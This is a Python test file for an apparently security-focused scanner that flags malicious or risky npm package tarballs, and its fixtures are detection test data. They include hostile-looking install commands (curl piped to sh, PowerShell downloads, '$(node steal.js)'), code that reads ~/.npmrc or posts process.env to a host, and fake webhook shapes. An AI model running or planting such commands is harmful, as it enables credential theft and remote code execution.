import base64
import io
import json
import re
import tarfile
import time
from pathlib import Path

import pytest

from buckthorn.findings import verdict
from buckthorn.scan import scan_artifact

MANIFEST = {"name": "pkg", "version": "1.0.0"}


def _rules(findings):
    return sorted(f.rule_id for f in findings)


@pytest.fixture
def make_npm(tmp_path: Path):
    """Write a tarball shaped like `npm pack` output: every member under package/.

    manifest is dumped as package/package.json unless raw bytes are given, or
    None to leave it out. Other members are given by their full path.
    """

    def _make(
        manifest: dict | None = MANIFEST,
        files: dict[str, str | bytes] | None = None,
        name: str = "pkg-1.0.0.tgz",
        raw: bytes | None = None,
    ) -> Path:
        members: dict[str, bytes] = {}
        if raw is not None:
            members["package/package.json"] = raw
        elif manifest is not None:
            members["package/package.json"] = json.dumps(manifest).encode()
        for member, data in (files or {}).items():
            members[member] = data.encode() if isinstance(data, str) else data
        path = tmp_path / name
        with tarfile.open(path, "w:gz") as tf:
            for member, data in members.items():
                info = tarfile.TarInfo(member)
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
        return path

    return _make


# Step 2: telling an npm tarball from a Python sdist.


def test_npm_tarball_with_only_package_json_is_clean(make_npm):
    assert scan_artifact(make_npm()) == []


@pytest.mark.parametrize("name", ["pkg-1.0.0.tgz", "pkg-1.0.0.tar.gz"])
def test_npm_tarball_is_read_as_npm_whatever_the_suffix(make_npm, name):
    # Read as an sdist, it would have no PKG-INFO: BKT-META-001.
    assert scan_artifact(make_npm(name=name)) == []


def test_code_that_runs_and_does_nothing_is_clean(make_npm):
    files = {"package/index.js": "module.exports = 1\n", "package/README.md": "not code"}
    assert scan_artifact(make_npm(files=files)) == []


def test_javascript_that_runs_and_does_not_tokenize_is_named(make_npm):
    files = {
        "package/index.js": "require('./lib/bad');\nrequire('./lib/bad.cjs');\n",
        "package/lib/bad.js": "x = 1\ny = 'open\n",
        "package/lib/bad.cjs": b"x = '\xff'",
        "package/lib/unused.js": "x = 'open\n",  # nothing loads it: not read
    }
    findings = scan_artifact(make_npm(files=files))
    notes = sorted((f.file_path, f.message) for f in findings)
    assert notes == [
        ("package/lib/bad.cjs", "JavaScript does not tokenize (not-utf8 at line 1)"),
        ("package/lib/bad.js", "JavaScript does not tokenize (unterminated-string at line 2)"),
    ]
    assert _rules(findings) == ["BKT-SKIP-003"] * 2
    assert verdict(findings) == "not_verified"


def test_javascript_past_the_package_budget_is_not_read(make_npm, monkeypatch):
    from buckthorn import npm

    monkeypatch.setattr(npm, "MAX_JS_BYTES", 100)
    files = {"package/index.js": "require('./a');\nrequire('./b');\nrequire('./c');\n"}
    files |= {f"package/{n}.js": "module.exports = 1;\n" + "x" * 10 for n in "abc"}
    findings = scan_artifact(make_npm(files=files))
    past = [f for f in findings if f.message == "JavaScript past 100 bytes in all is not read"]
    assert len(past) == 2  # index.js (51 bytes) and one file fit
    assert verdict(findings) == "not_verified"


@pytest.mark.parametrize(
    ("fields", "path", "source", "read_as_module"),
    [
        ({}, "x.cjs", "a <!-- fetch('u')\n", False),
        ({}, "x.mjs", "a <!-- fetch('u')\n", True),
        ({}, "x.js", "a <!-- fetch('u')\n", False),  # no import or export: a script
        ({}, "x.js", "export const a = 1;\nb <!-- fetch('u')\n", True),  # Node's detection
        ({"type": "module"}, "x.js", "a <!-- fetch('u')\n", True),
        ({"type": "commonjs"}, "x.js", "export const a = 1;\nb <!-- fetch('u')\n", False),
    ],
)
def test_html_like_comments_by_how_node_runs_the_file(
    make_npm, fields, path, source, read_as_module
):
    # `<!--` starts a comment in a script; in a module it is `<`, `!` and `--`.
    files = {f"package/{path}": source}
    findings = scan_artifact(make_npm(_with(main=path, **fields), files=files))
    assert ("BKT-NPM-IMPORT-001" in _rules(findings)) is read_as_module


@pytest.mark.parametrize(
    ("fields", "files", "note"),
    [
        ({}, {"package/index.js": "const m = require(name);\n"}, "named at run time"),
        ({}, {"package/index.js": "import(`./locale/${lang}.js`);\n"}, "named at run time"),
        ({"main": "addon.node"}, {"package/addon.node": b"\x7fELF"}, "native addon"),
        ({}, {"package/index.js": "module.exports = require('bindings')('addon');\n"}, "native"),
        (
            {},
            {"package/index.js": "require('./a.node');\n", "package/a.node": b"\x7fELF"},
            "native",
        ),
    ],
)
def test_code_that_runs_and_cannot_be_read_is_not_verified(make_npm, fields, files, note):
    findings = scan_artifact(make_npm(_with(**fields), files=files))
    assert verdict(findings) == "not_verified"
    assert any(f.rule_id == "BKT-SKIP-003" and note in f.message for f in findings)


@pytest.mark.parametrize(
    ("fields", "files"),
    [
        ({"bin": {"pkg": "cli.js"}}, {"package/cli.js": "require(name);\nx = 'open\n"}),
        (
            {},
            {"package/index.js": "function load(n) { return require(n) }\nexports.load = load;\n"},
        ),
        (
            {},
            {"package/lib/a.js": "x = 'open\n", "package/addon.node": b"\x7fELF"},
        ),  # nothing loads
        (
            {},
            {
                "package/index.js": "require(path.join(__dirname, 'lib', 'a.js'));\n",
                "package/lib/a.js": "module.exports = 1;\n",
            },
        ),
    ],
)
def test_code_that_does_not_run_on_its_own_does_not_block_clean(make_npm, fields, files):
    assert scan_artifact(make_npm(_with(**fields), files=files)) == []


@pytest.mark.parametrize(
    "extra",
    [
        "package/setup.py",
        "package/pyproject.toml",
        "package/setup.cfg",
        "package/PKG-INFO",
        "other/index.js",  # npm strips any first folder: this lands in the package too
        "index.js",
    ],
)
def test_npm_and_python_shapes_together_fail_closed(make_npm, extra):
    findings = scan_artifact(make_npm(files={extra: "x = 1\n"}))
    assert "BKT-SKIP-001" in _rules(findings)
    assert verdict(findings) != "clean"


def test_ambiguous_tar_still_reports_what_both_readings_find(make_npm):
    # Neither reading may hide the other's detections behind the coverage gap.
    setup = "import urllib.request\nurllib.request.urlopen('https://example.com')\n"
    manifest = _with(scripts={"postinstall": "node x.js"})
    path = make_npm(manifest, files={"package/setup.py": setup, "package/PKG-INFO": "x"})
    rules = _rules(scan_artifact(path))
    assert {"BKT-SKIP-001", "BKT-INSTALL-001", "BKT-NPM-SCRIPT-001"} <= set(rules)


def test_flat_sdist_with_a_js_folder_still_reads_setup_py(make_npm):
    setup = "import urllib.request\nurllib.request.urlopen('https://example.com')\n"
    files = {"setup.py": setup, "PKG-INFO": "Name: pkg\nVersion: 1.0\n"}
    path = make_npm(None, files=files | {"js/package.json": json.dumps(MANIFEST)})
    assert {"BKT-SKIP-001", "BKT-INSTALL-001"} <= set(_rules(scan_artifact(path)))


def _block(name: str, data: bytes) -> bytes:
    info = tarfile.TarInfo(name)
    info.size = len(data)
    return info.tobuf(tarfile.USTAR_FORMAT) + data + b"\0" * (-len(data) % 512)


@pytest.mark.parametrize("separator", [b"\0" * 512, b"X" * 512], ids=["zeros", "bad-header"])
def test_members_past_an_end_marker_or_bad_header_fail_closed(tmp_path, separator):
    # tarfile stops at one zero block or a bad header; node-tar reads on.
    import gzip

    evil = json.dumps(_with(scripts={"postinstall": "node x.js"})).encode()
    raw = (
        _block("package/package.json", json.dumps(MANIFEST).encode())
        + separator
        + _block("package/package.json", evil)
        + b"\0" * 1024
    )
    path = tmp_path / "pkg-1.0.0.tgz"
    path.write_bytes(gzip.compress(raw))
    findings = scan_artifact(path)
    assert "BKT-SKIP-001" in _rules(findings)
    assert verdict(findings) != "clean"


@pytest.mark.parametrize(
    "fields",
    [
        {"bin": {"tsc": "package.json"}},
        {"bin": {"tsc": "./lib/../package.json"}},
        {"name": "pkg", "bin": "package.json"},
        {"directories": {"bin": "."}},
    ],
)
def test_package_json_installed_as_a_command_is_not_clean(make_npm, fields):
    # sh runs a file with no #! line as a shell script, and JSON strings can hold $(...).
    findings = scan_artifact(make_npm(_with(**fields)))
    assert "BKT-SKIP-003" in _rules(findings)
    assert verdict(findings) != "clean"


def test_python_build_file_in_another_case_is_ambiguous(make_npm):
    # On a case-insensitive disk, Setup.py is setup.py to pip.
    path = make_npm(files={"package/Setup.py": "x = 1\n"})
    assert "BKT-SKIP-001" in _rules(scan_artifact(path))


def test_absolute_top_folder_is_ambiguous(make_npm):
    path = make_npm(None, files={"/package/package.json": json.dumps(MANIFEST)})
    assert "BKT-SKIP-001" in _rules(scan_artifact(path))


def test_npm_shape_on_a_cut_short_read_is_read_both_ways(make_npm, monkeypatch):
    # setup.py past the member cap is never seen, so the npm shape is not trusted.
    monkeypatch.setattr("buckthorn.scan.MAX_MEMBERS", 2)
    path = make_npm(files={"package/index.js": "", "package/setup.py": ""})
    rules = _rules(scan_artifact(path))
    assert {"BKT-SKIP-001", "BKT-SKIP-002"} <= set(rules)


def test_python_sdist_with_a_package_json_stays_an_sdist(make_sdist):
    # A JupyterLab extension sdist ships package.json beside PKG-INFO and setup.py.
    setup = "import urllib.request\nurllib.request.urlopen('https://example.com')\n"
    path = make_sdist({"setup.py": setup, "package.json": json.dumps(MANIFEST)})
    assert "BKT-INSTALL-001" in _rules(scan_artifact(path))


def test_npm_tarball_with_another_top_folder_is_npm(make_npm):
    # npm strips the first folder whatever its name; old registry tarballs vary.
    manifest = _with(scripts={"postinstall": "node x.js"})
    path = make_npm(None, files={"pkg/package.json": json.dumps(manifest)})
    findings = scan_artifact(path)
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-NPM-SCRIPT-001", "pkg/package.json")
    ]


def test_sdist_with_package_json_named_tgz_fails_closed(make_sdist, tmp_path):
    # .tgz is npm's suffix: a PKG-INFO beside package.json could be a decoy.
    path = make_sdist({"setup.py": "x = 1\n", "package.json": json.dumps(MANIFEST)})
    findings = scan_artifact(path.rename(tmp_path / "pkg-1.0.tgz"))
    assert "BKT-SKIP-001" in _rules(findings)
    assert verdict(findings) != "clean"


def test_sdist_named_like_npm_stays_an_sdist(make_sdist, tmp_path):
    path = make_sdist({"setup.py": "x = 1\n"})
    renamed = path.rename(tmp_path / "pkg-1.0.tgz")
    assert scan_artifact(renamed) == []


def test_tarball_that_will_not_open_fails_closed(tmp_path):
    path = tmp_path / "pkg-1.0.0.tgz"
    path.write_bytes(b"not a tarball")
    findings = scan_artifact(path)
    assert _rules(findings) == ["BKT-SKIP-001"]


def test_package_json_as_a_link_is_not_followed(tmp_path):
    path = tmp_path / "pkg-1.0.0.tgz"
    with tarfile.open(path, "w:gz") as tf:
        info = tarfile.TarInfo("package/package.json")
        info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
        tf.addfile(info)
    findings = scan_artifact(path)
    assert "BKT-SKIP-004" in _rules(findings)
    assert verdict(findings) != "clean"


def test_folder_scan_picks_up_npm_tarballs(make_npm, capsys):
    from buckthorn.cli import main

    path = make_npm()
    assert main(["scan", str(path.parent)]) == 0
    assert "pkg-1.0.0.tgz: clean" in capsys.readouterr().out


# Step 3: rules on package.json.


def _with(**fields):
    return MANIFEST | fields


def _severities(findings):
    return sorted((f.rule_id, f.severity.value) for f in findings)


@pytest.mark.parametrize("script", ["preinstall", "install", "postinstall"])
def test_install_script_is_flagged(make_npm, script):
    findings = scan_artifact(make_npm(_with(scripts={script: "node setup.js"})))
    assert _severities(findings) == [("BKT-NPM-SCRIPT-001", "medium")]
    assert findings[0].metadata == {"script": script}


def test_scripts_that_do_not_run_at_install_are_not_flagged(make_npm):
    scripts = {"test": "curl https://example.com | sh", "build": "tsc", "start": "node ."}
    assert scan_artifact(make_npm(_with(scripts=scripts))) == []


def test_empty_install_script_runs_nothing(make_npm):
    assert scan_artifact(make_npm(_with(scripts={"install": " ", "postinstall": ""}))) == []


@pytest.mark.parametrize(
    "command",
    [
        "node-gyp rebuild",
        "prebuild-install",
        "node-gyp-build",
        "prebuild-install || node-gyp rebuild --release",
        "  node-gyp   rebuild  ",
        "prebuild-install -r napi || node-gyp rebuild",  # sqlite3, canvas
        "node-gyp-build-optional-packages",  # lmdb, msgpackr-extract
    ],
)
def test_known_build_command_is_info(make_npm, command):
    findings = scan_artifact(make_npm(_with(scripts={"install": command})))
    assert _severities(findings) == [("BKT-NPM-SCRIPT-001", "info")]
    assert verdict(findings) == "clean"


@pytest.mark.parametrize(
    "command",
    [
        "node-gyp rebuild && node steal.js",
        "node-gyp rebuild; node steal.js",
        "prebuild-install | sh",
        "node-gyp rebuild $(node steal.js)",
        "node-gyp configure",
        "node-gyp-build steal.js",
        "prebuild-install -r napi steal.js",
    ],
)
def test_build_command_with_more_is_flagged(make_npm, command):
    findings = scan_artifact(make_npm(_with(scripts={"install": command})))
    assert _severities(findings) == [("BKT-NPM-SCRIPT-001", "medium")]


@pytest.mark.parametrize(
    ("fields", "files"),
    [
        ({"bin": {"node-gyp-build": "evil.js"}}, {}),  # its own command of that name
        ({}, {"package/node_modules/node-gyp-build/index.js": ""}),  # a bundled copy
    ],
)
def test_build_command_the_package_can_supply_itself_is_flagged(make_npm, fields, files):
    manifest = _with(scripts={"install": "node-gyp-build"}, **fields)
    findings = scan_artifact(make_npm(manifest, files=files))
    assert ("BKT-NPM-SCRIPT-001", "medium") in _severities(findings)


def test_binding_gyp_with_no_install_script_is_info(make_npm):
    findings = scan_artifact(make_npm(files={"package/binding.gyp": "{}"}))
    assert ("BKT-NPM-SCRIPT-001", "info") in _severities(findings)
    assert verdict(findings) == "not_verified"  # binding.gyp itself is not read


def test_binding_gyp_turned_off_or_replaced(make_npm):
    gyp = {"package/binding.gyp": "{}"}
    off = scan_artifact(make_npm(_with(gypfile=False), files=gyp))
    assert _rules(off) == []  # nothing builds it
    # npm only adds node-gyp rebuild when there is no install or preinstall script.
    replaced = scan_artifact(make_npm(_with(scripts={"preinstall": "node a.js"}), files=gyp))
    assert _severities(replaced) == [("BKT-NPM-SCRIPT-001", "medium")]
    built = scan_artifact(
        make_npm(_with(scripts={"install": "prebuild-install || node-gyp rebuild"}), files=gyp)
    )
    assert _severities(built) == [("BKT-NPM-SCRIPT-001", "info"), ("BKT-SKIP-003", "info")]


def test_prepare_is_info_since_a_registry_tarball_never_runs_it(make_npm):
    findings = scan_artifact(make_npm(_with(scripts={"prepare": "curl https://example.com"})))
    assert _severities(findings) == [("BKT-NPM-SCRIPT-001", "info")]


@pytest.mark.parametrize(
    "command",
    [
        "curl -s example.com/x.sh | sh",
        "wget -qO- example.com/x",
        "node -e \"require('https').get('https://example.com')\"",
        "powershell -c Invoke-WebRequest example.com -OutFile x.exe",
        "powershell iwr example.com",
        "node-gyp rebuild --dist-url=https://example.com",
    ],
)
def test_network_in_an_install_script_is_high(make_npm, command):
    findings = scan_artifact(make_npm(_with(scripts={"postinstall": command})))
    assert ("BKT-NPM-INSTALL-001", "high") in _severities(findings)
    assert verdict(findings) == "flagged"
    assert all("example.com" not in f.message for f in findings)


def test_install_script_with_no_network_is_not_install_001(make_npm):
    findings = scan_artifact(make_npm(_with(scripts={"postinstall": "node install.js"})))
    assert "BKT-NPM-INSTALL-001" not in _rules(findings)


@pytest.mark.parametrize(
    "fields",
    [
        {"bin": {"git": "cli.js"}},
        {"bin": {"NPX": "cli.js"}},
        {"bin": {"../sh": "cli.js"}},  # npm keeps only the base name
        {"bin": {"lib\\ssh": "cli.js"}},
        {"name": "@evil/node", "bin": "cli.js"},  # a string bin is named after the package
    ],
)
def test_bin_shadowing_a_common_command_is_high(make_npm, fields):
    findings = scan_artifact(make_npm(_with(**fields), name="evil-1.0.0.tgz"))
    findings = [f for f in findings if f.rule_id != "BKT-NPM-META-001"]
    assert _severities(findings) == [("BKT-NPM-BIN-001", "high")]


@pytest.mark.parametrize(("folder", "file"), [("./bin", "bin/ssh"), (".", "sh")])
def test_bin_directory_shadowing_a_common_command_is_high(make_npm, folder, file):
    path = make_npm(_with(directories={"bin": folder}), files={f"package/{file}": "x"})
    assert "BKT-NPM-BIN-001" in _rules(scan_artifact(path))


@pytest.mark.parametrize(
    ("manifest", "name"),
    [
        (_with(bin={"pkg": "cli.js", "pkg-dev": "dev.js"}), "pkg-1.0.0.tgz"),
        ({"name": "npm", "version": "11.0.0", "bin": {"npm": "a", "npx": "b"}}, "npm-11.0.0.tgz"),
        ({"name": "git", "version": "1.0.0", "bin": "cli.js"}, "git-1.0.0.tgz"),
    ],
)
def test_own_or_ordinary_bin_is_not_flagged(make_npm, manifest, name):
    assert scan_artifact(make_npm(manifest, name=name)) == []


def test_bin_of_the_wrong_type_fails_closed(make_npm):
    findings = scan_artifact(make_npm(_with(bin=["git"])))
    assert _rules(findings) == ["BKT-SKIP-003"]


@pytest.mark.parametrize(
    ("manifest", "name"),
    [
        ({"name": "@scope/pkg", "version": "1.0.0"}, "pkg-1.0.0.tgz"),  # registry name
        ({"name": "@scope/pkg", "version": "1.0.0"}, "scope-pkg-1.0.0.tgz"),  # npm pack name
        ({"name": "pkg", "version": "1.0.0-beta.1"}, "pkg-1.0.0-beta.1.tgz"),
        ({"name": "pkg", "version": "v1.0.0"}, "pkg-1.0.0.tgz"),  # npm cleans the version
    ],
)
def test_name_and_version_matching_the_file_name(make_npm, manifest, name):
    assert scan_artifact(make_npm(manifest, name=name)) == []


@pytest.mark.parametrize(
    "manifest",
    [
        {"name": "pkg", "version": "2.0.0"},
        {"name": "other", "version": "1.0.0"},
        {"name": "pkg"},
        {"name": 1, "version": "1.0.0"},
    ],
)
def test_name_or_version_not_matching_the_file_name_is_flagged(make_npm, manifest):
    findings = scan_artifact(make_npm(manifest))
    assert _severities(findings) == [("BKT-NPM-META-001", "medium")]


def test_long_name_is_cut_short_in_the_message(make_npm):
    findings = scan_artifact(make_npm({"name": "a" * 100_000, "version": "1.0.0"}))
    assert len(findings[0].message) < 400


@pytest.mark.parametrize(
    "raw",
    [
        b"{not json",
        b"[1, 2]",
        b"\xff\xfe{}",
        b"[" * 100_000 + b"]" * 100_000,  # nested too deep to parse
        json.dumps(MANIFEST | {"description": "a" * (6 * 1024 * 1024)}).encode(),  # too large
    ],
)
def test_package_json_that_cannot_be_read_fails_closed(make_npm, raw):
    findings = scan_artifact(make_npm(raw=raw))
    assert _rules(findings) == ["BKT-NPM-META-001", "BKT-SKIP-003"]
    assert verdict(findings) == "flagged"


@pytest.mark.parametrize(
    "fields",
    [
        {"scripts": "node setup.js"},
        {"scripts": {"postinstall": ["node", "setup.js"]}},
        {"directories": {"bin": 1}},
    ],
)
def test_fields_of_the_wrong_type_fail_closed(make_npm, fields):
    findings = scan_artifact(make_npm(_with(**fields)))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert verdict(findings) == "not_verified"


# Fake values in the real shapes. Never put a real channel in a test.
HOOK = f"https://discord.com/api/webhooks/{'1' * 18}/{'A' * 68}"
BOT_TOKEN = f"{'1' * 10}:AA{'A' * 33}"


def test_shipped_channels_in_package_json_are_flagged(make_npm):
    manifest = _with(config={"hook": HOOK, "deep": [{"t": f"bot{BOT_TOKEN}"}]})
    findings = scan_artifact(make_npm(manifest))
    assert _severities(findings) == [("BKT-EXFIL-001", "medium"), ("BKT-EXFIL-002", "medium")]
    assert all(HOOK not in f.message and BOT_TOKEN not in f.message for f in findings)


def test_ordinary_links_in_package_json_are_not_channels(make_npm):
    manifest = _with(homepage="https://discord.gg/abc", bugs={"url": "https://t.me/pkg"})
    assert scan_artifact(make_npm(manifest)) == []


def test_every_npm_rule_is_documented():
    root = Path(__file__).parent.parent
    pattern = r"BKT-NPM-[A-Z]+-\d{3}"
    ids = set(re.findall(pattern, (root / "buckthorn" / "npm.py").read_text()))
    assert ids == {
        "BKT-NPM-SCRIPT-001",
        "BKT-NPM-BIN-001",
        "BKT-NPM-META-001",
        "BKT-NPM-INSTALL-001",
        "BKT-NPM-INSTALL-002",
        "BKT-NPM-INSTALL-003",
        "BKT-NPM-INSTALL-004",
        "BKT-NPM-INSTALL-005",
        "BKT-NPM-INSTALL-006",
        "BKT-NPM-INSTALL-008",
        "BKT-NPM-IMPORT-001",
        "BKT-NPM-IMPORT-002",
        "BKT-NPM-IMPORT-003",
        "BKT-NPM-IMPORT-004",
        "BKT-NPM-IMPORT-005",
        "BKT-NPM-IMPORT-006",
        "BKT-NPM-IMPORT-008",
        "BKT-NPM-HIDE-001",
        "BKT-NPM-HIDE-002",
    }
    assert ids <= set(re.findall(pattern, (root / "docs" / "rules.md").read_text()))


# Phase 3: rules on the JavaScript that runs on its own. Fixtures are text
# read by the tokenizer, never run.


def _code(findings):
    """(rule, severity, file) for the code rules on JavaScript files."""
    return sorted(
        (f.rule_id, f.severity.value, f.file_path)
        for f in findings
        if f.rule_id.startswith(
            ("BKT-NPM-INSTALL-", "BKT-NPM-IMPORT-", "BKT-NPM-HIDE-", "BKT-EXFIL-")
        )
        and f.file_path != "package/package.json"
    )


HEAD = "const fs = require('fs'), os = require('os'), path = require('path');\n"
# Rule number -> (code that does it, code that looks like it and does not).
CODE_RULES = {
    "001": (
        "const https = require('https');\nhttps.get('https://example.com/x', (r) => {});\n",
        "const https = require('https');\nconst agent = new https.Agent({ keepAlive: true });\n",
    ),
    "002": (
        "const { execSync } = require('child_process');\nexecSync('make');\n",
        "const m = /a(b)/.exec(text);\nconst cp = require('child_process');\n",
    ),
    "003": ("eval(code);\n", "var root = Function('return this')();\n"),
    "004": (
        HEAD + "const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n",
        HEAD + "const where = path.join(os.homedir(), '.npmrc');\n",
    ),
    "005": (
        HEAD + "fs.appendFileSync(path.join(os.homedir(), '.bashrc'), 'x');\n",
        HEAD + "console.log('add this line to ~/.bashrc');\n",
    ),
    "006": (
        "const all = JSON.stringify(process.env);\n",
        "const cp = require('child_process');\n"
        "cp.spawn('x', [], { env: { ...process.env, A: '1' } });\n",
    ),
}
SEVERITY = {"001": "high", "002": "medium", "003": "medium", "004": "high", "005": "high"}
SEVERITY["006"] = "info"


@pytest.mark.parametrize("number", sorted(CODE_RULES))
def test_install_rules_on_the_file_an_install_script_runs(make_npm, number):
    firing, benign = CODE_RULES[number]
    manifest = _with(scripts={"postinstall": "node install.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/install.js": firing}))
    rule = f"BKT-NPM-INSTALL-{number}"
    assert (rule, SEVERITY[number], "package/install.js") in _code(findings)
    findings = scan_artifact(make_npm(manifest, files={"package/install.js": benign}))
    assert not [f for f in _code(findings) if f[0] == rule]


@pytest.mark.parametrize(
    ("source", "rules"),
    [
        # esbuild's install.js: a copy handed to a child process is not a read.
        (
            "const env = { ...process.env, npm_config_global: void 0 };\n"
            "require('child_process').execSync('npm install x', { env });\n",
            ["BKT-NPM-INSTALL-002"],
        ),
        (
            "const childEnv = Object.assign({}, process.env, { A: '1' });\nfetch('u');\n",
            ["BKT-NPM-INSTALL-001"],
        ),
        # Named otherwise, or serialised, it is.
        (
            "const dump = { ...process.env };\nfetch('u');\n",
            ["BKT-NPM-INSTALL-001", "BKT-NPM-INSTALL-006", "BKT-NPM-INSTALL-008"],
        ),
        (
            "const env = JSON.stringify(process.env);\nfetch('u');\n",
            ["BKT-NPM-INSTALL-001", "BKT-NPM-INSTALL-006", "BKT-NPM-INSTALL-008"],
        ),
    ],
)
def test_environment_for_a_child_process_is_not_a_read(make_npm, source, rules):
    manifest = _with(scripts={"postinstall": "node install.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/install.js": source}))
    assert [rule for rule, _, _ in _code(findings)] == rules


def test_whole_install_file_counts_including_functions(make_npm):
    # As for setup.py: an install file's functions are read, called or not.
    source = "function later() { require('https').request('https://example.com') }\n"
    manifest = _with(scripts={"preinstall": "node ./scripts/pre.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/scripts/pre.js": source}))
    assert ("BKT-NPM-INSTALL-001", "high", "package/scripts/pre.js") in _code(findings)


def test_credentials_or_environment_with_network_is_critical(make_npm):
    source = (
        "const https = require('https');\n"
        "const req = https.request({ host: 'example.com', method: 'POST' });\n"
        "req.write(JSON.stringify(process.env));\n"
    )
    manifest = _with(scripts={"install": "node index.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/index.js": source}))
    assert ("BKT-NPM-INSTALL-008", "critical", "package/index.js") in _code(findings)
    assert all("example.com" not in f.message for f in findings)


@pytest.mark.parametrize(
    ("command", "path", "source"),
    [
        ("node scripts/post", "scripts/post.js", "fetch('u')\n"),  # extensions, as Node adds them
        ("node lib", "lib/index.js", "fetch('u')\n"),  # a folder's index.js
        ("./post.js", "post.js", "#!/usr/bin/env node\nfetch('u')\n"),  # run as a file
        ("cd lib && node post.js", "lib/post.js", "fetch('u')\n"),
        ("node --no-warnings -r ./pre.js main.js", "pre.js", "fetch('u')\n"),
        ("node -e \"require('./post')\"", "post.js", "fetch('u')\n"),
        ("node -e \"try{require('./post')}catch(e){}\" || true", "post.js", "fetch('u')\n"),
        ("npm run build", "b.js", "fetch('u')\n"),
    ],
)
def test_how_install_scripts_name_the_javascript_they_run(make_npm, command, path, source):
    scripts = {"postinstall": command, "build": "node b.js"}
    findings = scan_artifact(make_npm(_with(scripts=scripts), files={f"package/{path}": source}))
    assert ("BKT-NPM-INSTALL-001", "high", f"package/{path}") in _code(findings)


def test_inline_code_in_an_install_script_is_read(make_npm):
    command = "node -e \"require('child_process').execSync('make')\""
    findings = scan_artifact(make_npm(_with(scripts={"install": command})))
    found = [(f.rule_id, f.file_path, f.metadata.get("script")) for f in findings]
    assert ("BKT-NPM-INSTALL-002", "package/package.json", "install") in found


def test_local_files_an_install_file_loads_are_read_at_top_level(make_npm):
    files = {
        "package/install.js": "const net = require('./lib/net');\nnet.send();\n",
        "package/lib/net.js": (
            "const https = require('https');\n"
            "exports.send = function () { https.get('https://example.com') };\n"
            "exports.unused = function () { require('child_process').exec('x') };\n"
        ),
    }
    manifest = _with(scripts={"postinstall": "node install.js"})
    findings = scan_artifact(make_npm(manifest, files=files))
    assert _code(findings) == [("BKT-NPM-INSTALL-001", "high", "package/lib/net.js")]
    [finding] = [f for f in findings if f.rule_id == "BKT-NPM-INSTALL-001"]
    assert "in send(), called at install by package/install.js" in finding.message


def test_a_script_that_is_not_javascript_is_not_read(make_npm):
    manifest = _with(scripts={"postinstall": "sh ./install.sh"})
    findings = scan_artifact(make_npm(manifest, files={"package/install.sh": "curl x | sh\n"}))
    notes = [f.message for f in findings if f.rule_id == "BKT-SKIP-003"]
    assert any("install.sh" in m and "not read" in m for m in notes)


def test_install_file_that_does_not_tokenize_fails_closed(make_npm):
    manifest = _with(scripts={"postinstall": "node install.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/install.js": "x = 'open\n"}))
    assert ("BKT-SKIP-003", "package/install.js") in [(f.rule_id, f.file_path) for f in findings]
    assert verdict(findings) == "flagged"  # the install script itself is still medium


# Step 6.2: the code `require` runs.


@pytest.mark.parametrize("number", sorted(CODE_RULES))
def test_import_rules_on_the_entry_file(make_npm, number):
    firing, benign = CODE_RULES[number]
    rule = f"BKT-NPM-IMPORT-{number}"
    findings = scan_artifact(make_npm(files={"package/index.js": firing}))
    assert (rule, SEVERITY[number], "package/index.js") in _code(findings)
    findings = scan_artifact(make_npm(files={"package/index.js": benign}))
    assert not [f for f in _code(findings) if f[0] == rule]


@pytest.mark.parametrize(
    ("source", "rules"),
    [
        # Found on the benign top 1,000, and fixed.
        ("module.exports = config({ fs: { deny: ['.env', '.npmrc'] } });\n", []),  # vite
        ("let f;\ntry { f = new Function(); } catch (_) {}\n", []),  # @emnapi/runtime
        ("if ('FORCE_COLOR' in process.env) { level = 1; }\n", []),  # @colors/colors
        ("for (const key in process.env) { use(key); }\n", ["BKT-NPM-IMPORT-006"]),
        ("const x = 1;\nexport {}", []),  # an empty export list at the end of a file
        ("const {} = require('./a'), [] = [];\n", []),  # patterns that bind nothing (ws)
    ],
)
def test_benign_shapes_found_on_the_top_packages(make_npm, source, rules):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert [rule for rule, _, _ in _code(findings)] == rules


def test_import_credentials_or_environment_with_network_is_critical(make_npm):
    source = (
        "fetch('https://example.com', { method: 'POST', body: JSON.stringify(process.env) });\n"
    )
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert ("BKT-NPM-IMPORT-008", "critical", "package/index.js") in _code(findings)


NETWORK = "require('https').get('https://example.com');\n"


@pytest.mark.parametrize(
    ("fields", "path"),
    [
        ({"main": "lib/main"}, "lib/main.js"),
        ({"main": "lib"}, "lib/index.js"),
        ({"main": "missing.js"}, "index.js"),  # Node falls back to index.js
        ({"exports": "./dist/a.cjs"}, "dist/a.cjs"),
        ({"exports": {"import": "./esm/a.mjs", "require": "./cjs/a.js"}}, "esm/a.mjs"),
        ({"exports": {"import": "./esm/a.mjs", "require": "./cjs/a.js"}}, "cjs/a.js"),
        ({"exports": {".": "./a.js", "./sub": {"node": {"default": "./s.js"}}}}, "s.js"),
        ({"exports": {"./feature/*": "./lib/feature/*.js"}}, "lib/feature/x.js"),
        ({"main": "a.js", "exports": {".": "./b.js"}}, "a.js"),  # older Node reads main
    ],
)
def test_entry_files(make_npm, fields, path):
    findings = scan_artifact(make_npm(_with(**fields), files={f"package/{path}": NETWORK}))
    assert ("BKT-NPM-IMPORT-001", "high", f"package/{path}") in _code(findings)


def test_files_nothing_loads_and_bin_commands_are_not_read(make_npm):
    files = {
        "package/index.js": "module.exports = 1;\n",
        "package/cli.js": NETWORK,  # a bin: runs when the user runs it
        "package/scripts/release.js": NETWORK,  # nothing loads it
        "package/test/a.test.js": NETWORK,
    }
    findings = scan_artifact(make_npm(_with(bin={"pkg": "cli.js"}), files=files))
    assert _code(findings) == []


@pytest.mark.parametrize(
    "source",
    [
        "function f() { require('https').get('u') }\nf();\n",
        "const f = () => require('https').get('u');\nf();\n",
        "(function () { require('https').get('u') })();\n",
        "!function () { require('https').get('u') }();\n",
        "(async () => { await fetch('u') })();\n",
        "(function () { fetch('u') }).call(this);\n",
        "setTimeout(() => fetch('u'), 1000);\n",
        "Promise.resolve().then(function () { fetch('u') });\n",
        "function main() { helper() }\nfunction helper() { fetch('u') }\nmain();\n",
